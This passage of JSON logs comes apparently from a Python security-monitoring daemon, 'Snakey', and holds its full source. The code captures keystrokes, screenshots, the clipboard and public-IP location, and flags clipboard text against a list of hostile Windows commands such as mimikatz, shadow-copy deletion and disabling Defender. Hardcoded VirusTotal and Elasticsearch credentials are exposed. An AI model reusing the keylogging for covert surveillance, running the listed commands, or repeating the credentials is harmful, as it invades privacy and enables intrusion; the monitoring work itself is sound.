/s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'rmdir /s /q')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net user')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'net localgroup administrators')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'taskkill /f /im')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'schtasks /create')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'reg delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mimikatz')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'certutil -urlcache -f -split')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wmic shadowcopy delete')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'vssadmin delete shadows')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'powershell -nop -w hidden -c')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'invoke-expression')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'set-mppreference -disablerealtimemonitoring $true')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bcdedit /set {current} safeboot network')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'mshta.exe http')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'bitsadmin /transfer')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'wevtutil cl system')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'cipher /w')", "Sensitive CMD command detected in clipboard: 'import os\r import time\r import json\r import socket\r import getpass\r import hashlib\r import platform...' (matched: 'sdelete -z')"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (794 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "86dc640ab69e27f80283816c14c3cffc18a1247e9232f2adeb70c6d530504d30", "screenshot_hash": "aea534f992212a25cede4f7e176732a00b5e0837f75410d614c939233cc40209", "_raw_log_hash": "e8940a5de09ece4df797401f646421127539638fd6d03d8a0d26e97483b331b2"}
{"timestamp": "2025-06-10T17:49:28.409023", "system": {"username": "user", "hostname": "MSI", "private_ip": "172.20.10.2", "public_ip": "46.50.2.132", "country": "PT", "region": "Lisbon", "city": "Lisbon", "isp": "AS42863 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime, timedelta\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\nfrom elasticsearch import Elasticsearch, ConnectionError, TransportError, AuthenticationException\r\nimport ssl\r\nimport shutil\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\n# json_log_path = os.path.join(base_path, \"snakey_log.json\") # NO LONGER USED FOR MAIN LOGS\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\ndaemon_log_file = os.path.join(base_path, \"snakey_daemon_errors.log\")\r\n\r\nscreenshot_information = \"screenshot.png\" # Temporary screenshot file\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"] # Example: only trust Spain access\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\n# === Sensitive Command Detection Configuration ===\r\nSENSITIVE_CMD_COMMANDS = [\r\n    \"format c:\",                # Formatting drives\r\n    \"del /s /q\",                # Force delete (subdirectories, quiet)\r\n    \"rmdir /s /q\",              # Force remove directory (subdirectories, quiet)\r\n    \"net user\",                 # User management (info or creation)\r\n    \"net localgroup administrators\", # Admin group checks\r\n    \"taskkill /f /im\",          # Force kill process by image name\r\n    \"schtasks /create\",         # Create scheduled tasks (persistence)\r\n    \"reg delete\",               # Delete registry keys\r\n    \"mimikatz\",                 # Credential dumping tool\r\n    \"certutil -urlcache -f -split\", # Common technique for downloading files\r\n    \"wmic shadowcopy delete\",   # Delete volume shadow copies (often pre-ransomware)\r\n    \"vssadmin delete shadows\",  # Delete volume shadow copies\r\n    \"powershell -nop -w hidden -c\", # Common PowerShell obfuscation for execution\r\n    \"invoke-expression\",        # PowerShell alias for 'iex' - executes strings as commands\r\n    \"set-mppreference -disablerealtimemonitoring $true\", # Disable Windows Defender\r\n    \"bcdedit /set {current} safeboot network\", # Set network safe mode (persistence/bypass)\r\n    \"mshta.exe http\",           # HTML Application (often for remote code execution)\r\n    \"bitsadmin /transfer\",      # Download files via BITS\r\n    \"wevtutil cl system\",       # Clear event logs\r\n    \"cipher /w\",                # Overwrite free space (anti-forensics)\r\n    \"sdelete -z\",               # Secure delete tool\r\n]\r\n\r\n# === Logging Function ===\r\ndef log_daemon_message(level, message):\r\n    timestamp = datetime.now().isoformat()\r\n    log_entry = f\"[{timestamp}] [{level}] {message}\\n\"\r\n    try:\r\n        with open(daemon_log_file, \"a\") as f:\r\n            f.write(log_entry)\r\n        print(log_entry.strip()) # Also print to console for immediate feedback\r\n    except Exception as e:\r\n        print(f\"[CRITICAL ERROR] Failed to write to daemon log file: {e}\")\r\n        print(log_entry.strip()) # Still print even if file write fails\r\n\r\n# === Encryption Key Loading ===\r\nif not os.path.exists(key_path):\r\n    log_daemon_message(\"ERROR\", \"Encryption key not found! Run GenerateKey.py first. Exiting.\")\r\n    exit(1)\r\n\r\ntry:\r\n    with open(key_path, \"rb\") as key_file:\r\n        key = key_file.read()\r\n    fernet = Fernet(key)\r\n    log_daemon_message(\"INFO\", \"Encryption key loaded successfully.\")\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Failed to load encryption key: {e}. Exiting.\")\r\n    exit(1)\r\n\r\n# === Elasticsearch Configuration ===\r\nELASTIC_HOST = 'localhost'\r\nELASTIC_PORT = 9200\r\nELASTIC_USER = 'elastic'\r\nELASTIC_PASSWORD = 'vNODISLG+5Y0f*U4mKaI'\r\n\r\nes_client = None\r\n\r\nes_precheck_successful = False\r\nlog_daemon_message(\"INFO\", \"Performing basic requests.get pre-check to Elasticsearch endpoint.\")\r\ntry:\r\n    response = requests.get(f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\", auth=(ELASTIC_USER, ELASTIC_PASSWORD), verify=False, timeout=10, stream=True)\r\n    log_daemon_message(\"DEBUG\", f\"Basic requests.get status: {response.status_code}\")\r\n    response.raw.read(1) # Read a byte to force connection establishment\r\n    response.close() # Close the connection\r\n    if response.status_code == 200:\r\n        log_daemon_message(\"INFO\", \"Basic requests.get pre-check successful (status 200).\")\r\n        es_precheck_successful = True\r\n    else:\r\n        log_daemon_message(\"WARNING\", f\"Basic requests.get pre-check returned non-200 status: {response.status_code}. Not proceeding with ES client init.\")\r\n\r\nexcept requests.exceptions.ConnectionError as e:\r\n    log_daemon_message(\"ERROR\", f\"requests.ConnectionError during pre-check: {e}. Possible firewall, service down, or wrong host/port.\")\r\nexcept requests.exceptions.Timeout:\r\n    log_daemon_message(\"ERROR\", \"requests.Timeout during pre-check: Connection timed out.\")\r\nexcept requests.exceptions.RequestException as e:\r\n    log_daemon_message(\"ERROR\", f\"requests.RequestException during pre-check: {e}. Could be SSL, authentication, or other request error.\")\r\nexcept Exception as e:\r\n    log_daemon_message(\"ERROR\", f\"Unexpected error during basic requests pre-check: {e}\")\r\n\r\nif es_precheck_successful:\r\n    try:\r\n        es_client = Elasticsearch(\r\n            hosts=[f\"https://{ELASTIC_HOST}:{ELASTIC_PORT}\"],\r\n            basic_auth=(ELASTIC_USER, ELASTIC_PASSWORD),\r\n            verify_certs=False,\r\n            ssl_show_warn=False,\r\n            request_timeout=30\r\n        )\r\n        # Attempt to ping to confirm full connection\r\n        if es_client.ping():\r\n            log_daemon_message(\"INFO\", \"Elasticsearch client initialized and connected successfully.\")\r\n        else:\r\n            log_daemon_message(\"ERROR\", \"Elasticsearch client initialized but failed to ping the cluster.\")\r\n            es_client = None\r\n    except ConnectionError as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Connection Error during client init: {e}. Check network, service status, firewall.\")\r\n        es_client = None\r\n    except AuthenticationException as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Authentication Error during client init: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n        es_client = None\r\n    except TransportError as e:\r\n        log_daemon_message(\"ERROR\", f\"Elasticsearch Transport Error during client init (HTTP status {e.status_code}): {e.info}. Problem on ES server or request formatting.\")\r\n        es_client = None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during Elasticsearch client initialization: {e}\")\r\n        es_client = None\r\nelse:\r\n    log_daemon_message(\"WARNING\", \"Elasticsearch pre-check failed. Elasticsearch client will not be initialized.\")\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except FileNotFoundError:\r\n        log_daemon_message(\"ERROR\", f\"File not found for hashing: {filepath}\")\r\n        return None\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode('utf-8')).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1]) # Duplicate last hash if odd number\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        # VirusTotal expects a URL to be URL-safe base64 encoded for API v3 lookup,\r\n        # but the original code uses SHA256. Sticking to SHA256 for now,\r\n        # but be aware this might not be the correct VT v3 URL ID format.\r\n        # For correct VT v3 URL lookup, you'd typically need to base64 encode the URL.\r\n        # Example: base64.urlsafe_b64encode(url.encode()).decode().strip(\"=\")\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n            log_daemon_message(\"WARNING\", f\"VirusTotal URL lookup failed (404 Not Found) for hash {url_id}. URL likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\", f\"VirusTotal URL lookup failed with status {response.status_code} for {url}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT URL lookup failed: {e}\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during VT URL lookup: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        if not os.path.exists(file_path):\r\n            log_daemon_message(\"ERROR\", f\"File not found for VT lookup: {file_path}\")\r\n            return {}\r\n\r\n        file_hash = hash_file(file_path)\r\n        if not file_hash: # If hashing failed\r\n            return {}\r\n\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER, timeout=5)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n        elif response.status_code == 404:\r\n             log_daemon_message(\"WARNING\", f\"VirusTotal File lookup failed (404 Not Found) for hash {file_hash} from {file_path}. File likely not previously analyzed by VT.\")\r\n        else:\r\n            log_daemon_message(\"WARNING\", f\"VirusTotal File lookup failed with status {response.status_code} for {file_path}: {response.text}\")\r\n    except requests.exceptions.RequestException as e:\r\n        log_daemon_message(\"ERROR\", f\"VT File lookup failed: {e}\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Unexpected error during VT File lookup: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        # Ensure timestamp is string for JSON serialization\r\n        if 'timestamp' in data and isinstance(data['timestamp'], datetime):\r\n            data['timestamp'] = data['timestamp'].isoformat()\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        log_daemon_message(\"INFO\", \"Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Wazuh log file write failed: {e}\")\r\n\r\ndef send_to_elasticsearch(data):\r\n    global es_client\r\n    if es_client:\r\n        try:\r\n            data_to_send = data.copy()\r\n            # Ensure timestamp is ISO format for Elasticsearch\r\n            if 'timestamp' in data_to_send and isinstance(data_to_send['timestamp'], datetime):\r\n                data_to_send['timestamp'] = data_to_send['timestamp'].isoformat()\r\n\r\n            # Ensure lists are not empty before sending for Kibana visualization\r\n            # If an empty list goes, Kibana's 'is not empty' filter might not work as expected\r\n            if not data_to_send.get('alerts'):\r\n                data_to_send['alerts'] = [] # Ensure it's an empty list if no alerts\r\n\r\n            log_daemon_message(\"DEBUG\", f\"Attempting to send log to Elasticsearch for timestamp: {data_to_send['timestamp']}\")\r\n            response = es_client.index(index=\"snakey_logs\", document=data_to_send)\r\n            log_daemon_message(\"SUCCESS\", f\"Log enviado para Elasticsearch. ID: {response['_id']}\")\r\n        except ConnectionError as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Connection Error during send: {e}. Check network, service status, firewall.\")\r\n        except AuthenticationException as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Authentication Error during send: {e}. Check ELASTIC_USER and ELASTIC_PASSWORD.\")\r\n        except TransportError as e:\r\n            log_daemon_message(\"ERROR\", f\"Elasticsearch Transport Error during send (HTTP status {e.status_code}): {e.info}. Problem on ES server or data format.\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Falha inesperada ao enviar log para Elasticsearch: {e}\")\r\n    else:\r\n        log_daemon_message(\"WARNING\", \"Cliente Elasticsearch n\u00e3o est\u00e1 configurado ou conectado. O log n\u00e3o ser\u00e1 enviado.\")\r\n\r\n# === New: Analyze Clipboard for Sensitive Commands ===\r\ndef analyze_clipboard_for_sensitive_commands(clipboard_content, alerts_list):\r\n    \"\"\"\r\n    Analyzes clipboard content for predefined sensitive command patterns.\r\n    Adds alerts to the alerts_list if matches are found.\r\n    \"\"\"\r\n    if not clipboard_content or not isinstance(clipboard_content, str):\r\n        return alerts_list\r\n\r\n    normalized_clipboard = clipboard_content.lower().strip()\r\n\r\n    for sensitive_cmd in SENSITIVE_CMD_COMMANDS:\r\n        if sensitive_cmd.lower() in normalized_clipboard:\r\n            alerts_list.append(\r\n                f\"Sensitive CMD command detected in clipboard: \"\r\n                f\"'{clipboard_content[:100].replace('\\n', ' ').strip()}...' (matched: '{sensitive_cmd}')\"\r\n            )\r\n            # Continue to find all matches in the clipboard, do not break\r\n\r\n    return alerts_list\r\n\r\n# === Main Log Collection Function ===\r\ndef collect_full_session():\r\n    current_time = datetime.now() # Use this for consistent timestamping\r\n    session_log = {\r\n        \"timestamp\": current_time.isoformat(), # Use consistent timestamp\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [], # This list will be populated\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        # System Info Collection\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        try:\r\n            session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n        except socket.gaierror as e:\r\n            session_log[\"system\"][\"private_ip\"] = f\"Error: {e}\"\r\n            session_log[\"alerts\"].append(f\"Could not get private IP: {e}\")\r\n\r\n        try:\r\n            ip_info = requests.get(\"https://ipinfo.io/json\", timeout=5).json()\r\n            session_log[\"system\"][\"public_ip\"] = ip_info.get(\"ip\")\r\n            session_log[\"system\"][\"country\"] = ip_info.get(\"country\")\r\n            session_log[\"system\"][\"region\"] = ip_info.get(\"region\")\r\n            session_log[\"system\"][\"city\"] = ip_info.get(\"city\")\r\n            session_log[\"system\"][\"isp\"] = ip_info.get(\"org\", \"Unknown\")\r\n\r\n            if ip_info.get(\"country\") and ip_info[\"country\"] not in known_countries:\r\n                session_log[\"alerts\"].append(f\"Access from untrusted country: {ip_info['country']}\")\r\n        except requests.exceptions.Timeout:\r\n            session_log[\"alerts\"].append(\"IP info lookup timed out.\")\r\n            log_daemon_message(\"WARNING\", \"IP info lookup timed out.\")\r\n        except requests.exceptions.RequestException as e:\r\n            session_log[\"alerts\"].append(f\"IP info lookup failed: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"IP info lookup failed: {e}\")\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Unexpected error during IP info lookup: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Unexpected error during IP info lookup: {e}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"System info collection error: {e}\")\r\n\r\n    # Clipboard Collection and Analysis\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            win32clipboard.OpenClipboard()\r\n            try:\r\n                clipboard_content = win32clipboard.GetClipboardData()\r\n                session_log[\"clipboard\"] = clipboard_content\r\n            except TypeError: # If clipboard is empty or non-text content\r\n                session_log[\"clipboard\"] = \"Clipboard is empty or contains non-text data.\"\r\n            win32clipboard.CloseClipboard()\r\n            session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n            # NEW: Analyze clipboard for sensitive commands\r\n            analyze_clipboard_for_sensitive_commands(session_log[\"clipboard\"], session_log[\"alerts\"])\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Clipboard error: {e}\")\r\n    else:\r\n        session_log[\"clipboard\"] = \"Clipboard collection not supported on this OS.\"\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n\r\n    # Screenshot Collection and VT Scan\r\n    screenshot_path = os.path.join(base_path, screenshot_information) # Define path here\r\n    if platform.system() == \"Windows\":\r\n        try:\r\n            im = ImageGrab.grab()\r\n            im.save(screenshot_path)\r\n            session_log[\"screenshot_taken\"] = True\r\n            session_log[\"screenshot_hash\"] = hash_file(screenshot_path) # Hash of screenshot image file\r\n\r\n            # VirusTotal Scan for screenshot\r\n            vt_result = vt_lookup_file(screenshot_path)\r\n            if vt_result:\r\n                session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n                if vt_result.get(\"malicious\", 0) > 0:\r\n                    session_log[\"alerts\"].append(f\"VirusTotal flagged screenshot file as malicious: {vt_result.get('malicious')} positives.\")\r\n            else:\r\n                log_daemon_message(\"INFO\", \"No VirusTotal result for screenshot or scan failed.\")\r\n\r\n        except Exception as e:\r\n            session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n            log_daemon_message(\"ERROR\", f\"Screenshot error: {e}\")\r\n        finally:\r\n            # Clean up the temporary screenshot file\r\n            if os.path.exists(screenshot_path):\r\n                try:\r\n                    os.remove(screenshot_path)\r\n                    log_daemon_message(\"DEBUG\", f\"Removed temporary screenshot file: {screenshot_path}\")\r\n                except Exception as e:\r\n                    log_daemon_message(\"ERROR\", f\"Failed to remove temporary screenshot file: {e}\")\r\n    else:\r\n        session_log[\"screenshot_taken\"] = False\r\n        session_log[\"alerts\"].append(\"Screenshot collection not supported on this OS.\")\r\n\r\n\r\n    # VirusTotal Scan for Clipboard URL (if applicable)\r\n    # Ensure clipboard is a string before checking .startswith()\r\n    if isinstance(session_log[\"clipboard\"], str) and session_log[\"clipboard\"].strip().lower().startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n            if vt_result.get(\"malicious\", 0) > 0:\r\n                session_log[\"alerts\"].append(f\"VirusTotal flagged clipboard URL as malicious: {vt_result.get('malicious')} positives.\")\r\n        else:\r\n            log_daemon_message(\"INFO\", \"No VirusTotal result for clipboard URL or scan failed.\")\r\n\r\n    # Keylogger\r\n    keys = []\r\n    def on_press(key):\r\n        nonlocal keys # Ensure we modify the 'keys' list from outer scope\r\n        try:\r\n            if hasattr(key, 'char') and key.char is not None:\r\n                keys.append(key.char)\r\n            elif key == Key.space:\r\n                keys.append(' ')\r\n            elif key == Key.enter:\r\n                keys.append('[ENTER]')\r\n            elif key == Key.backspace:\r\n                keys.append('[BACKSPACE]')\r\n            elif key == Key.tab:\r\n                keys.append('[TAB]')\r\n            else:\r\n                keys.append(f\"[{str(key).replace('Key.', '')}]\")\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Error in on_press keylogger: {e}\")\r\n\r\n    log_daemon_message(\"INFO\", \"Keylogger running for 10 seconds. Create 'stop_snakey.txt' to terminate earlier.\")\r\n    listener = None\r\n    try:\r\n        with Listener(on_press=on_press) as listener:\r\n            start_time = time.time()\r\n            while time.time() - start_time < 10: # Collect keystrokes for 10 seconds\r\n                time.sleep(0.5) # Sleep for shorter intervals to check stop file more often\r\n                if check_stop_file():\r\n                    log_daemon_message(\"INFO\", \"Stop file detected. Exiting keylogger.\")\r\n                    break\r\n            listener.stop()\r\n            log_daemon_message(\"INFO\", \"Keylogger session completed.\")\r\n    except Exception as e:\r\n        log_daemon_message(\"ERROR\", f\"Keylogger listener error: {e}. This might happen if not running in a desktop session or permissions issue.\")\r\n        if listener: # Attempt to stop listener cleanly even on error\r\n            try:\r\n                listener.stop()\r\n            except Exception as stop_e:\r\n                log_daemon_message(\"WARNING\", f\"Error stopping keylogger listener: {stop_e}\")\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n\r\n    # Important Directories Check\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n\r\n    # Before proceeding, ensure alerts list is not None (shouldn't be, but as a safeguard)\r\n    if session_log[\"alerts\"] is None:\r\n        session_log[\"alerts\"] = []\r\n\r\n    # --- Immutable Cold Storage (Enhanced Flat-File System) Logic ---\r\n    # 1. Prepare the full log for encryption\r\n    # We will hash the raw JSON string content of the log *before* encryption\r\n    # This hash acts as an internal integrity check within the log itself\r\n    log_string_for_internal_hash = json.dumps(session_log, sort_keys=True, default=str)\r\n    session_log[\"_raw_log_hash\"] = hash_text(log_string_for_internal_hash) # Store hash of raw log inside\r\n\r\n    # 2. Encrypt the entire session log\r\n    try:\r\n        encrypted_log_data = fernet.encrypt(log_string_for_internal_hash.encode('utf-8'))\r\n        \r\n        # 3. Define unique filename for encrypted log file\r\n        encrypted_filename = f\"log_{current_time.strftime('%Y%m%d_%H%M%S_%f')}.enc\"\r\n        full_encrypted_filepath = os.path.join(encrypted_path, encrypted_filename)\r\n\r\n        # 4. Save the encrypted log to a file\r\n        with open(full_encrypted_filepath, \"wb\") as f_enc:\r\n            f_enc.write(encrypted_log_data)\r\n        log_daemon_message(\"SUCCESS\", f\"Encrypted log saved to: {full_encrypted_filepath}\")\r\n\r\n        # 5. Hash the encrypted file content (for the blockchain ledger)\r\n        encrypted_file_hash = hash_file(full_encrypted_filepath)\r\n        if not encrypted_file_hash:\r\n            log_daemon_message(\"ERROR\", \"Failed to hash encrypted log file. Ledger will not be updated with this log.\")\r\n            return session_log # Exit without updating ledger for this log\r\n\r\n        # 6. Update the blockchain-style hash ledger with the encrypted file's hash\r\n        try:\r\n            ledger = []\r\n            if os.path.exists(hash_ledger_path):\r\n                try:\r\n                    with open(hash_ledger_path, \"r\") as f:\r\n                        ledger = json.load(f)\r\n                    # Convert legacy format if needed\r\n                    if ledger and isinstance(ledger[0], str): # Check if old format (list of hashes)\r\n                        log_daemon_message(\"INFO\", \"Converting legacy hash ledger format to new dict format.\")\r\n                        converted_ledger = []\r\n                        prev_h = \"0\" * 64\r\n                        for h in ledger:\r\n                            converted_ledger.append({\r\n                                \"timestamp\": current_time.isoformat(), # Cannot determine true timestamp for old entries\r\n                                \"encrypted_file_hash\": h,\r\n                                \"previous_encrypted_file_hash\": prev_h,\r\n                                \"chained_hash\": hash_text(h + prev_h),\r\n                                \"encrypted_filepath\": \"legacy_path_unknown\"\r\n                            })\r\n                            prev_h = h\r\n                        ledger = converted_ledger\r\n                        log_daemon_message(\"SUCCESS\", \"Legacy hash ledger converted.\")\r\n                except json.JSONDecodeError:\r\n                    log_daemon_message(\"WARNING\", \"Existing hash ledger file is corrupt. Starting with empty ledger.\")\r\n                    ledger = []\r\n            else:\r\n                ledger = []\r\n\r\n            previous_encrypted_file_hash = ledger[-1][\"encrypted_file_hash\"] if ledger else \"0\" * 64\r\n            chained_hash_input = encrypted_file_hash + previous_encrypted_file_hash\r\n            chained_hash = hash_text(chained_hash_input)\r\n\r\n            ledger_entry = {\r\n                \"timestamp\": current_time.isoformat(),\r\n                \"encrypted_file_hash\": encrypted_file_hash,\r\n                \"previous_encrypted_file_hash\": previous_encrypted_file_hash,\r\n                \"chained_hash\": chained_hash,\r\n                \"encrypted_filepath\": full_encrypted_filepath # Store the path to the encrypted log\r\n            }\r\n\r\n            ledger.append(ledger_entry)\r\n\r\n            with open(hash_ledger_path, \"w\") as f:\r\n                json.dump(ledger, f, indent=4)\r\n\r\n            log_daemon_message(\"SUCCESS\", \"Blockchain-style hash ledger updated with encrypted log hash.\")\r\n\r\n            # 7. Update Merkle Root\r\n            hash_list_for_merkle = [entry[\"encrypted_file_hash\"] for entry in ledger]\r\n            merkle_root = build_merkle_tree(hash_list_for_merkle)\r\n\r\n            with open(merkle_root_path, \"w\") as f:\r\n                f.write(merkle_root)\r\n\r\n            log_daemon_message(\"SUCCESS\", \"Merkle root saved (based on encrypted file hashes).\")\r\n\r\n        except Exception as e:\r\n            log_daemon_message(\"ERROR\", f\"Failed to update hash ledger or Merkle root: {e}\")\r\n\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Encryption or encrypted file save error: {e}\")\r\n        log_daemon_message(\"ERROR\", f\"Encryption or encrypted file save error: {e}\")\r\n\r\n    # Return the session_log for Elasticsearch and Wazuh (containing clear-text data for these)\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    log_daemon_message(\"INFO\", \"Starting Snakey in daemon mode...\")\r\n\r\n    # Initial check for stop file in case it 